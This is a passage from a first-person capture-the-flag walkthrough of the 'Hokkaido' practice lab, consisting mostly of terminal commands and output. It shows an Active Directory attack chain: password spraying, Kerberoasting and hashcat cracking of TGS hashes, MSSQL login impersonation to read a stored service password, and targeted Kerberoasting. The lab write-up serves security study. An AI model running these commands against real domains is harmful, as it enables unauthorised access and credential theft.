┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ cd port445smb/NETLOGON                                                                 
                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/Practice/Hokkaido/port445smb/NETLOGON]
└─$ ls -la
total 4
drwxr-xr-x 2 root root    0 Nov 25  2023 .
drwxrwxr-x 9 kali kali 4096 Dec  4 13:27 ..
drwxr-xr-x 2 root root    0 Dec  6  2023 temp
                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/Practice/Hokkaido/port445smb/NETLOGON]
└─$ cd temp                       
                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/Hokkaido/port445smb/NETLOGON/temp]
└─$ ls    
password_reset.txt
                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/Hokkaido/port445smb/NETLOGON/temp]
└─$ cat password_reset.txt    
Initial Password: Start123!
```

Started brute forcing with a new password using the crackmapexec tool and found a new user’s credential: `discovery:Start123!`.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ crackmapexec smb 192.168.163.40 -u usernames.txt -p passwords.txt --continue-on-success
SMB         192.168.163.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
SMB         192.168.163.40  445    DC               [+] hokkaido-aerospace.com\info:info
...
...
...
SMB         192.168.163.40  445    DC               [+] hokkaido-aerospace.com\INFO:info
...
...
...
SMB         192.168.163.40  445    DC               [+] hokkaido-aerospace.com\Info:info
...
...
... 
SMB         192.168.163.40  445    DC               [+] hokkaido-aerospace.com\discovery:Start123!
...
...
... 
SMB         192.168.163.40  445    DC               [+] hokkaido-aerospace.com\Discovery:Start123!
...
...
...
```

With these new credentials, I tested the Kerberos and found a new `maintenance` user’s hash. I tried to crack the hash using the `Hashcat` tool and used the `rockyou.txt` wordlist but wasn’t able to crack the hash.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ impacket-GetUserSPNs -dc-ip 192.168.163.40 'hokkaido-aerospace.com'/'discovery':'Start123!' -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                   Name         MemberOf                                           PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -----------  -------------------------------------------------  --------------------------  ---------  ----------
discover/dc.hokkaido-aerospace.com     discovery    CN=services,CN=Users,DC=hokkaido-aerospace,DC=com  2023-12-06 10:42:56.221832  <never>               
maintenance/dc.hokkaido-aerospace.com  maintenance  CN=services,CN=Users,DC=hokkaido-aerospace,DC=com  2023-11-25 08:39:04.869703  <never>               

[-] CCache file is not found. Skipping...
$krb5tgs$23$*discovery$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/discovery*$91a61e94e5964e8b400e64e1dfe576fa$ca56a3f545bffc6781dcbdf09a510a846533f4004e758defcd4624b11a49cdc4289bd83fddcffbc49a05b25358f6344864984632c17a16acee57f0225056cedcb99f970d51f11379c1741d7515fd65de9707a5ffe940d7338e206ef4fd3e948027a28b95d2f2b7b623fcb3b0e8617986910b0ec85a27dda6037725985bebbb8f0ac6add64e8e14d9b2ffeee710ab76facace64560b1031ff36a649ddea114ee424047a792c76c81ae66ca5642da4b059e15b1e2c45ed918029a5475d02e7e5ff6347ba4908d379f92d33133e4a518cff6fae436a037e8ea7557c1a4f0bf1a88978d4fe10036c8433b04a4403ff8cf8fb5557bde31f98df2f912b0f151deb0d0357cd2a460be7309eee3cb43dceff738c71239f63fc16b9dc37ed7b69e6187ea65d63c4b6ade9fde99007c26d8337677746f1e33d269ad3ee4b64d42344c452d751d478d3c883b58cfe6d45b5eac5ae1bc43a2ff16d61a31cd6d0c608d17f9a2dea91c812a8c58ea3d3d51a8f185ce89068af74ada4a17a9fb270025cdf67dbf13ad87b67334f4c5d580ac046ef226c349a423cdfbff9bd2f284e0c4c7c5d2c157e20a4073d15f04acaf6259a1423b41d04525dcbff07e4e6ceeadd74c8af23893c4dea0ea3caba4a4c17f1eb44d81076924b8663fe41a48b68dc2991338b302ab3f3aaf614f752ca962f3af815dcb0e8efaed14a64a52981994307657beb7ad2975a3860d014d3b5e8afe14e0772c1b2f7c805b63daf1d32611742ceb665af0b8c69aa225b9ef48f35cd50ad437bb72a0560c3dd084ab570f1535d6b44c39085e9718c1e55a4e2a765289ec13c85659a3377768302029e77c47acc936feac76b18aab6e22e097582bdeed17d17abde1f6103cc307d0d1d7152ab6a2afd5b1f232f25189df4bd36304862e9dee6bb87114c1709c269d968be66d2a62e3da3ca91ebc2b5320f9d319eccd804df0c1de91168dde76902d4b895a798dde6f7b9664ebf3da7ccb76955abda9e650ed5ba0ab18068487bfb858ae2d95fe64587730694dd117a5fa7d808c266a6a09e9a831c0ae3b66558bb53456de27bb6aae8b4d9556c905704bb7e63a42bfb0910082240e3bd38c78d68b31723ec4eadcc09f58df8692e22025c11436b31c6c6cc78645f2d1796cdecd7a1c75d2849ccc3446ad3545480aa1decd8ef4030b39ec070e925db0c69c761862ec04b1e731ae71ac0b8b6a522af044e0e0e14365dac3a25bb2350b42a34d6df6df05ef5e8065c00120684132168e4ee757fa9a4a86a33eb07b7d55653f1948e7c27e771533d0e6c08df3636e0fda6fff1ce84998eb45887e98b112b5f987edf7dbb535a8fa8750bb1987b4f56a73cd524e3508da1d6217d64462864ff9307e50fefba68b32f8a6c636dba839a218f94394afb2db2661c88f4d5ec4cca2ea54d94bc6365fbfbee0115cf9501d9f82f2fc8b7f43a06776d73f3e389f947842c298ba3b966fb226ad055e989b5d95e5fa3d2ef2da89d8ef6fb37daff5e1e2b7f840ac9b379277cbc20b94442d16e131ebf66937bdae8ddd697614bd342a713d4941ed8deb9cdf9d805c5214c
$krb5tgs$23$*maintenance$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/maintenance*$fcd1ace03f970474ed78b4a7b5db3b1c$08b35bfba09b469684160fd782c3def4ad8eb4544227970c933f86b684384c80d11ab06d1f82c2d38ebf9afe6d0d7fbfdf2c3466393aa0bd79453a9dddc3e941f348778054f774b2aac9850fbad3165744dd50c9410f2f38a98c87e3dfec97c076257b73e1f16a6661da67b07dc987c7448af60c5a64c0610d67cac3b97089caa4828eee0cf61b00ed95063ec37631aebfad7c2fcf77168c9b5fbc53d2a62c0fb9b14642e2b3f477e47f6f165ff0f696ea1cbac7043181d1d6fd9857343d4bebb0ada8f8c45648a233214085c2560d1203bd75e8f7c715b7ecda9ff04ced4a3720ce5b867c86b6d029a2f5eab06c1e9b9624d8cb6255fc74cf8338827ffa072c660c602dbfef7fec91e22ad9650b26c54f909ad4e647a8163ff8cf8b4728a8a62d8961b2aa66d6ad13ba79d22bef528609079eb10954613dc89320dab937b6a04b37117e3294bd0a54a55c4d6c70e5f8cafd68c8e6b9cd484497dd931967c095d6e7142a0d155565ac3956111f332b50707f2974534703d0035f5c8f1232c3da6c8be139051afdb77151dd32f7a230c86f63c4a4f94c7c5bf1372876fa5fd0be1a4bf3756017702e6f803b2d9ea3bacc6b0a59dfdf1c14eda110bc333f5039904c28c4cc29e7884a40913c883f51ed5fcd4893b25bfa5d3a2d27bfe6d3bd0c01c16770d91f74b52d1080abf09a5d3dbb6d79aefa50a50b0c72b14915335c7ca7e8066af0e726f9a2362f59655f01ddeff43f90a579409b60492563ff323837bf84a6ec96289a1d2bcccdd04306178df59d3df75cdbaa3d438e24eef809faab206dad51b326040428dc96d2a541ae8f6282237b04d71ac1dea43db074eb8de2cf41ba0a58c6d9a1e3526060ed89089d624dc26125dda1eec8b5fd8fe7e0181fa790692b608b97d01453839a72d2c96a7cfdb29a6466978fae34a5d426b520d58e763aca0d6748165d1a9f6450a88248369a7ef07ad685a00a8cd62c2bb7c2f1b06826c5f25e7fe60841cf977453a7497ed007427cb75ae495b2846420c1005c3141672c68a9d90d46fda5361ef96b1a53aea9bfd3dd047a1c8a60fda885a7e23706d4455e01f5457ef32efcffcb23bbda81afd0a51258813a5a48b7d28c1e7c997459417b624f8f79ba6fb0ff7fca210ea9b46fe306fa90657c9c2d28ebc2a4744916382eaa3db62ab4abbaa310bd8d8eb8bd42e95b819682c16849045e76b8254cf7d8ca80376313c768809df72b165a184a094fc97ab8f2c846e75db37d35ca979b15b8b8bc2ca347288e39709da6e677c8c00479bcf8fd01501d25eb914021c2586660935a62dcf574412350229b9516f2deb87bc065856b271318b144f068c3bb4c037c1b058648e0a8c8e3a56b6e39d014cca8ecce62c03b1d4b4d0dd9041c666f822f8714291e9a136e222c5350fafadb2b256b70075eb838c085fc349c377070f4aaccb87f8635703c56ad2887b81e3bffcd62db4ea6788d0ad77bdd9f788e866fb646844b780403657246520dc4abc296dd37d5ebeacb64f89d2fd7aa0b5b27ee263b8819b36a3a5e68755ffc536f82c6989f59e10074966ffb7f31ff
```

```
C:\...\...\hashcat-7.1.2>hashcat.exe -m 13100 ..\hashes.txt ..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt
hashcat (v7.1.2) starting
...
...
...
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*maintenance$HOKKAIDO-AEROSPACE.COM$hok...7f31ff
Time.Started.....: Sat Jan 17 21:47:16 2026 (2 secs)
Time.Estimated...: Sat Jan 17 21:47:18 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  5775.8 kH/s (5.95ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Speed.#03........:   362.6 kH/s (20.48ms) @ Accel:53 Loops:1 Thr:32 Vec:1
Speed.#*.........:  6138.4 kH/s
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14283584/14344384 (99.58%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#03..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: .fut@pilot. -> $HEX[042a0337c2a156616d6f732103]
Candidates.#03...: 0022792 -> .futura
Hardware.Mon.#01.: Temp: 44c Util: 35% Core:1890MHz Mem:7001MHz Bus:8
Hardware.Mon.#03.: N/A

Started: Thu Dec 04 19:30:02 2025
Stopped: Thu Dec 04 19:30:50 2025
```

I tried to use the `discovery:Start123!` credential on the MSSQL service and found the new user’s password: `hrapp-service:Untimed$Runny`.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ impacket-mssqlclient  'hokkaido-aerospace.com/discovery':'Start123!'@192.168.163.40 -dc-ip 192.168.163.40 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (HAERO\discovery  guest@master)> SELECT name FROM master..sysdatabases;
name      
-------   
master    
tempdb    
model     
msdb      
hrappdb
SQL (HAERO\discovery  guest@tempdb)> SELECT * FROM tempdb.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------

SQL (HAERO\discovery  guest@master)> use hrappdb
ERROR(DC\SQLEXPRESS): Line 1: The server principal "HAERO\discovery" is not able to access the database "hrappdb" under the current security context.

SQL (HAERO\discovery  guest@tempdb)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name             
--------------   
hrappdb-reader   

SQL (HAERO\discovery  guest@tempdb)> EXECUTE AS LOGIN = 'hrappdb-reader'

SQL (hrappdb-reader  guest@tempdb)> use hrappdb
ENVCHANGE(DATABASE): Old Value: tempdb, New Value: hrappdb
INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'hrappdb'.

SQL (hrappdb-reader  hrappdb-reader@hrappdb)> SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
hrappdb         dbo            sysauth      b'BASE TABLE'   
SQL (hrappdb-reader  hrappdb-reader@hrappdb)> select * from sysauth;
id   name               password           
--   ----------------   ----------------   
 0   b'hrapp-service'   b'Untimed$Runny'
```

I ran the `bloodhound-python` to check the active directory users and passwords using new credentials and checked the output in the bloodhound tool. The `Hrapp-service` with the `GenericWrite` permission and abuse method gives an idea about the targeted Kerberoasting.

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Hokkaido/screenshots/image.png)

The Targeted Kerberoasting output gives `Hazel.Green` user’s hash. I tried to crack this new hash, and this time it cracked.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ ~/tools/windows/targetedKerberoast/targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.163.40
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Hazel.Green)
[+] Printing hash for (Hazel.Green)
$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$27c4456081d2814d998be29960bd3fa4$5353d86166fcd0c59b1c49330d1f419fa572a0645dcae25a0479e9c5ff6cdeb100c3b7e6ee082653a69b66a03379f8c89803084c325f2110a0ed45fa2f2b7ccada2b3bce7be43e4a85c83ce7449287019863d2315ba8627b9ee69c683d4d925a24fe552849ccdbf86b13d655cd7ed580b7b6767667be6635c1572a2d9f625464e0b060f455ed585c8dde64cf046ba1cde4afff5e42401b227db1d965f1e639a7908c47b9bbfa362f30654757e0cfa90759995fa20cb4fcaa082e3053b86f54244aa0c5b2619ecd1ac8806d977d17f3572c6552574d2d1ddad107e6c70d916230aa35a4c790873961db2c4b33a82aec1e64851f4958b0a624cdc826211fee13b6bba3010dd351e9e73c3e060d8e21846151b47dbb08a9c6b9dbcc579b52eef23883da9d6a44791e03931f7cfc91d880ccc7f655c49cab0df36b2168bd22c38bb20fb7c640ac6393edd1ff7495b0702c5c89d532b6780bdacc3fe5a76be6f03818aac2c699a6e83a93d2ae1372af9d01b579d809ef5f2d4adb6bb7e158c2f0da5f342e49e4aab1ec02f1a82bcb1e79618cd6837dc7db1085ed17fff35c12f49cd1d27449aa6a509cde7fee2015152ba11b177d7940847209c61bfce386eea168d20cee3f97e0a08bd6f6828a9bfb3aac2dc81a684bfdcd43a489ed33a9526016168e9684322c675c421d922b70f557ce3b501ab288be54072d615eacd4d353aacf71855bb303640576d74dac9ae6f4e13d599eabc03a3e596cba6c2e8c96e7f6b0210ab2493cb795be1658b0f8828fa8d749f77b2e0506cdfd9f412f997aff29e23a2d3b933c082e5b5e646592a72340bde7cef627cbfad4ccfc3bfe85b2d897226273099b653fe161a8427b6b7437a1bcb90315c079d505ebb241f2269d827e08c8822d97077617ff00fd31c13d41aad3392a388f9cfc652ed6b9c31e280c9eea8861d478c21f8319c2d0408d7f2f343126b01e4778d4891e9b6a70a0a1614d45d5ada10cb303ef2ed74e4b5f1cf6af304c8aaa8e66967098251342e5837748076c2fed6b8d2dbd9fb6ff1228cbbb0bd53066d764a8b387dc6775e240425358382ec7f980abc93593279db5152fe2cfafc3f1681fcda9b20ac7a95e7bfaeb023ab0a4209321f2c11279668ef486b8dfc395f0bd717ef70ca8e4402c0e114bc07bc3566b516fc2aa365712a52bbc110df284b6d4f76ba4a78f064af1efb868baca7d26e2df70a6e6470a4e5950e7553017ec4275cc58b948aefaa993d384119f0488de0035173987aa613b4ba7aa6c5333aa30d9c83b80451b6f02ce26f9b59025c42873ec756b62f9f53e267c83cd8e3d1e02ccdaac95f147b24ee6f240e5794fe086341c47431aa3448cf04c798b953ba244cdea88a97e5a246722d31496e895036f125b9fcced2fa59e6485d01527e30224c3030ee99ec164abd9c6188fd47110a07b53993e6a68843600ea2f31d0926ebe3a9037bc002c081e7557dbc78e422e789cded9b04532366aaf0a905048770db30c618e1a0dafce4bc30101f73e375685be7b5f440d07a5cbe2bf141e1f1bc4e3ebb6b3e66c64dd6ca522f9d9d346b94a043ea0b0e85e9e325c6a962254575f11cbb9f66673990f1e2f47da949b5a655939adf5bcdaa7101e3f20
[VERBOSE] SPN removed successfully for (Hazel.Green)
[+] Printing hash for (discovery)
$krb5tgs$23$*discovery$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/discovery*$5c4e266c83752627efd0b569bfcd4c6f$f1c347ebcb02246f8db32264fa4f1168ba39554afc09cae31b4c696d632734bb04a15f67bdd991a46838f745b2e2048b86576d660526d577b1936cf18019ebc64f87c26eb13cb90fb3eb59b2951ce72535c4e1c9d88ab0086dfeebd33b9b5ed25697095443b96f55c9e1e793f23a4ed315b377a79f8385f857f0c5edda4e515dd3284a14d3e4f354cb92fcab256e53ef2e28240cac210cfa131d0ab424183e3e4e292a7eee43e5dc34df6b866c66c96b728311042020bbca84b93fa0d73a640e963580dcd43c460d0c2f7c276f1f0a42ee2aaa86e5b12fbe5bfe889281540b2ee35f1392b897abcbfacf1e9fab3b349e12c9b338d2fbf45212bfb7b8ef070deecf943dd7dc7ebc978d6cf8152ef3f94c39fc363b142370cb3f35dfae95efa2c108dcd09a5f028b8b90fe3e61f9bd2b6a9a8e41f3a7f63b0746e6f8bab881ee252db9f7e233f0e84990cfcd5031014f752f198cfe73b099b5fc017ec89b8a6cb6305dd5cedfa931fc4d452d7234468a18d1c92d055c79ee0822570cced7e8cbfae6413e8a5038e782fd6af7c407c6da44c420eb7a839f9557398d5906c689a8637aa48cff131d088b79b55342e9c5b2cbda8795089e637c50fb9c3cff184466556e9ec0c0ed5f32fb34f7157b3f30257cf15f5aaa33afc2bc9d1acabe66e89a9bc2160d86cf69058f36d9940a27360064a8f9db18dd590b4c92505978152ea313f41a1d4a2594945022c7b554117d1f189fc491f8da72eadba7598f4f506a3ce09b5aaad8b7a5a522a2919fa5c3e78bc66ee64d3f040333f741046d2a9cbc23213a71350809f2da0a2738251fe3409c37cc0c949d0b8099bb13f47fd98a4f59f6fdf6a53051a3902a1c60bf58a0492a0242e237c1f757cca636162c6baf8ba34693325507ba1e3d52ff5f5947c473ac2de520611eba2f9643a5133f12bc577aad50eb382691b5e28614ee13073687bec21601e6145f52ca039cf4a39c3ce76f99fc8fa98b3c926ae1dde02676000c00f4bb365fa66478261835bf5c7a8e295763511ad666f8f23a36677df2c19b94cc9d801a615f891c99f961c8175f312e6fd6d993e1eda6d0e757447acc33fad81ce3a89f765c5507d81136bb92c5a6a3f4d1e3e4dbb119531c2d9d2527896c39cb9ae176e2d2a8bc7cdb032b1a58b0a23f7cedaf0e9eda801eb2d0bf51b17507f10f05fea878589cf7a9d9cbdd2d5e58db253fb960b168fddfc1eb01b3648faa2fe6e5f755cb86b34c14a92ef871029005e22cfd52e6c4db31cfe8e6bff7bae55cc0a53b56b1f0fee0a673253cbc10d6502a9d8286a3170589a07a615caf093c0c14e5ac20955056f959ac2e048908c762bec5e40fc76159f783011a8dcce6c8d8dbcacd50d59ebd706aaca0a5ce9ecf539607c0c7016bda7f9b904e5332e9a18ccc523085e69fe29ad9cf03bd56e7e01bae6d7c9b158ec104b1d446bdf6492df9cd23426bdc66bd7303398c24feb7604ff6be053eec493ba4bdf81230f9dfe16e41d765e954c9282b00aa9fa0375fb0ecf87bca9d8f917b57e2eb3b0d4d842b2101dd05802074ed59a9b00ca85739593dc826d58ace2034d13fdea83829525cbf215d15ec0dd6ed351560631ad89aa3bf0df66db14c2ad3d4b22f2c0c2c
[+] Printing hash for (maintenance)
$krb5tgs$23$*maintenance$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/maintenance*$b24938952ec3ed7b9d773756260ff448$a389cb4cc5a18dabfcd5254326708937a253b601b77c635d8cd43b1283b5247a3ab3648503a97742cfb1987b99faaf4ecb2ccc1bcff553a5f33fc14c38b77461f0802cbdc843604b0c98cad2db1a6f56b9f4a19fa91b708feafabd8bcf08863c388530c5c8ab88ec4c893c4bf32437290517669c98c9ccba7bf77bac42ab3845e789bf7e2b3206f1dcc47c88ad5d52c19624ff8a087fcbb428b19fb54f9ead2dbcaf7abdeb78bcc253d1fc85fdcb93dca60f4ae8589f0d7b6b18c2820223c44841da60df2dc4865424ede4e11f7421f392816d8ee210cdf706c6f92079c6c9fff9dd2908ef67efcb2a37ecc718a29d6746230d6c67f9d9ad2a21fa6f49a6c5d475d18750fbd336413f0c6f1badc1da6f7d176afc72995c740f033723294478b96c532730dd6963e92befa3c8f99eb195e63b434a6c4b0be599add918badf97819c2e4bf7a36f965d3d4b6eb7d3bc4c97e40f8c7a9bf02a2228c65c9d0cf412f4035e94ae957175d2299082bb6df5f773d16c5d77235ac32e20c92d006c0ec6748e036d01a7d6b5fac04de1d95c7d42f890913fbf1db7377599732b7c60e2554269d111cd3021ac185fe916fc16b4d6238aa074e3573d9389e142aca89a4361ff5d0773977cd06e1b9a10f9c6ee0776fdd2e74ef495d1b6a4b9149cacfca74f1d71e2f620338feda7082cdef5c73a24b8c6d1ce9ddb5244b9dc2c784e4dec87d3dfde34fcf9afdaa1eed6e1c69c195faa24a8bb771495fcf4fe3b8205f1831052a4d95024ea512d9c5bd7e191f27541c4751d24ff82a93ecf496a8bd0d8b9876ffd03748094c934132d7b1873d15085baf62d0f87091451cb3dce23806018a2bf87de2f169fd3b3f7a6945d83dbc3b089730fba95a899aca3fd42e2f50bc5460b1fb8ec431ff6ddac23ca31fc4d2fb270c69c9181e1d11c5458e9d7b9645013df53b819db7d01d23a2c25775122c7caf080d8b81b193e8f45efa66297cf4a1513431a4f64e3173a808ff02b2e7c83371a26a023e31da80e0f22d1e01a82cf6a4174abd0dcb3aa1b95206a4a36106d4d487db9a41704c721f886d17be5ce28a2ada62b1caa6fba219054cfe3ff3af89153c7db69adc00cf621f1e75db186b8f033fd1888cc3e272d54e866cfb3b5b7ee773d2e3b55d6e21326b1fd9103905240c63b9025e7ad9f45c74ecfe9e2252617ee3ea52abd41b6aaab99361b4d38e66bcc896562ad63d2a465654f355269995efab03c6559f699c0044511d8f08825aff887d350f14247a364387bb3666bf807ef3dcc3da4181b8f810f60098493d8b2c9ddb29890e9c42d4b37e37c1d2ac3dc076a121b6c9d791d11bdeee97c6e305456ad97f59ad81ff315671042647b0c2041a8da8bb19f3abbf670b30d175351bc87780588393460f48947300c2028cde1e9cdb226427c230f4699cf3bcc27860a618f1a466093fb5a69dc278ef8d3a579138de3462db5c94a025828b7087dc83c7149544a671a84b69297bb0c5165e13bb1f886da1226d0a3e50908ba501915436c0ce08f1ca814c5b37bcc6e7ad75bd8f7553bbbb05c1957b87523b98a163a7f36030d53cd222a4c6b34a3b48ea319e3e1abec4a7389cf30ce8cccb4fc7071d7b4d4f339eefc1d66759acb59a8
```

```
C:\...\...\hashcat-7.1.2>hashcat.exe -m 13100 ..\hashes.txt ..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt --force
hashcat (v7.1.2) starting
...
...
...
Dictionary cache hit:
* Filename..: ..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$27c4456081d2814d998be29960bd3fa4$5353d86166fcd0c59b1c49330d1f419fa572a0645dcae25a0479e9c5ff6cdeb100c3b7e6ee082653a69b66a03379f8c89803084c325f2110a0ed45fa2f2b7ccada2b3bce7be43e4a85c83ce7449287019863d2315ba8627b9ee69c683d4d925a24fe552849ccdbf86b13d655cd7ed580b7b6767667be6635c1572a2d9f625464e0b060f455ed585c8dde64cf046ba1cde4afff5e42401b227db1d965f1e639a7908c47b9bbfa362f30654757e0cfa90759995fa20cb4fcaa082e3053b86f54244aa0c5b2619ecd1ac8806d977d17f3572c6552574d2d1ddad107e6c70d916230aa35a4c790873961db2c4b33a82aec1e64851f4958b0a624cdc826211fee13b6bba3010dd351e9e73c3e060d8e21846151b47dbb08a9c6b9dbcc579b52eef23883da9d6a44791e03931f7cfc91d880ccc7f655c49cab0df36b2168bd22c38bb20fb7c640ac6393edd1ff7495b0702c5c89d532b6780bdacc3fe5a76be6f03818aac2c699a6e83a93d2ae1372af9d01b579d809ef5f2d4adb6bb7e158c2f0da5f342e49e4aab1ec02f1a82bcb1e79618cd6837dc7db1085ed17fff35c12f49cd1d27449aa6a509cde7fee2015152ba11b177d7940847209c61bfce386eea168d20cee3f97e0a08bd6f6828a9bfb3aac2dc81a684bfdcd43a489ed33a9526016168e9684322c675c421d922b70f557ce3b501ab288be54072d615eacd4d353aacf71855bb303640576d74dac9ae6f4e13d599eabc03a3e596cba6c2e8c96e7f6b0210ab2493cb795be1658b0f8828fa8d749f77b2e0506cdfd9f412f997aff29e23a2d3b933c082e5b5e646592a72340bde7cef627cbfad4ccfc3bfe85b2d897226273099b653fe161a8427b6b7437a1bcb90315c079d505ebb241f2269d827e08c8822d97077617ff00fd31c13d41aad3392a388f9cfc652ed6b9c31e280c9eea8861d478c21f8319c2d0408d7f2f343126b01e4778d4891e9b6a70a0a1614d45d5ada10cb303ef2ed74e4b5f1cf6af304c8aaa8e66967098251342e5837748076c2fed6b8d2dbd9fb6ff1228cbbb0bd53066d764a8b387dc6775e240425358382ec7f980abc93593279db5152fe2cfafc3f1681fcda9b20ac7a95e7bfaeb023ab0a4209321f2c11279668ef486b8dfc395f0bd717ef70ca8e4402c0e114bc07bc3566b516fc2aa365712a52bbc110df284b6d4f76ba4a78f064af1efb868baca7d26e2df70a6e6470a4e5950e7553017ec4275cc58b948aefaa993d384119f0488de0035173987aa613b4ba7aa6c5333aa30d9c83b80451b6f02ce26f9b59025c42873ec756b62f9f53e267c83cd8e3d1e02ccdaac95f147b24ee6f240e5794fe086341c47431aa3448cf04c798b953ba244cdea88a97e5a246722d31496e895036f125b9fcced2fa59e6485d01527e30224c3030ee99ec164abd9c6188fd47110a07b53993e6a68843600ea2f31d0926ebe3a9037bc002c081e7557dbc78e422e789cded9b04532366aaf0a905048770db30c618e1a0dafce4bc30101f73e375685be7b5f440d07a5cbe2bf141e1f1bc4e3ebb6b3e66c64dd6ca522f9d9d346b94a043ea0b0e85e9e325c6a962254575f11cbb9f66673990f1e2f47da949b5a655939adf5bcdaa7101e3f20:haze1988

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hok...1e3f20
Time.Started.....: Thu Dec 04 19:44:54 2025, (1 sec)
Time.Estimated...: Thu Dec 04 19:44:55 2025, (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (..\SecLists-master\Passwords\Leaked-Databases\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  8706.0 kH/s (5.86ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Speed.#03........:   599.2 kH/s (12.02ms) @ Accel:53 Loops:1 Thr:32 Vec:1
Speed.#*.........:  9305.2 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7710976/14344384 (53.76%)
Rejected.........: 0/7710976 (0.00%)
Restore.Point....: 6987776/14344384 (48.71%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#03..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: jgb345 -> harisabtu
Candidates.#03...: haleyvine -> habibi14
Hardware.Mon.#01.: Temp: 46c Util: 49% Core:1980MHz Mem:7001MHz Bus:8
Hardware.Mon.#03.: N/A

Started: Thu Dec 04 19:44:51 2025
Stopped: Thu Dec 04 19:44:56 2025
```

I checked `Hazel.Green`’s password using `crackmapexec`, and it returned a false positive.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ crackmapexec mssql 192.168.163.40 -u 'Hazel.Green' -p 'haze1988'
MSSQL       192.168.163.40  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:hokkaido-aerospace.com)
MSSQL       192.168.163.40  1433   DC               [-] hokkaido-aerospace.com\Hazel.Green:haze1988 name 'logging' is not defined
                                                                                                                                                                           
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ impacket-mssqlclient  'hokkaido-aerospace.com/Hazel.Green':'haze1988'@192.168.163.40 -dc-ip 192.168.163.40 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
